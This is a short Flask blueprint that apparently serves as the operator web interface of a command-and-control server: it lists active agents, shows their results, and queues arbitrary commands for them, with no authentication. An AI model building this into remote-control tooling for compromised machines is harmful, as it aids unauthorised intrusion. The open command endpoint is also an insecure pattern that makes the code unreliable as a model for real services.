from flask import Blueprint, render_template, request, jsonify
import state

ui_api = Blueprint('ui_api', __name__)

@ui_api.route("/")
def index():
    return render_template("index.html")

@ui_api.route("/api/agents")
def get_agents():
    # Return a list of all active agents
    return jsonify(list(state.active_agents.values()))

@ui_api.route("/api/results/<agent_id>")
def get_results(agent_id):
    # Return the list of results for this agent, or empty list if none
    return jsonify(state.results.get(agent_id, []))

@ui_api.route("/api/command/<agent_id>", methods=["POST"])
def send_command(agent_id):
    data = request.json
    if not data or "command" not in data:
        return jsonify({"error": "No command provided"}), 400
        
    command = data["command"]
    state.pending_commands[agent_id] = command
    print(f"[*] Command pending for {agent_id} via UI: {command}")
    
    return jsonify({"status": "ok", "command": command})
